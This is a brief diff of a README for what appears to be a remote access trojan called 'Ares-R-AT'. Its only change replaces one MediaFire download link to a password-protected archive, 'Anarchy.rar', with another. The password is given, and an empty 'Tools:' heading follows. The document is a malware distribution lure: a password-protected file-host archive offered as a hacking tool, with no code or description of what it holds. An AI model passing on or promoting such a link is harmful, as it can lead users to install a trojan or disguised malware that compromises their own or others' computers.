@@ -1,6 +1,6 @@
 # Ares-R-AT-V-1-2-2
 
-[Click Here to Download](https://www.mediafire.com/file/5nclieu118egayn/Anarchy.rar/file)
+[Click Here to Download](https://www.mediafire.com/file/2xk3tcg9tdtxfog/Anarchy.rar/file)
 [Pass: S0f4fr33!]
 
 Tools:
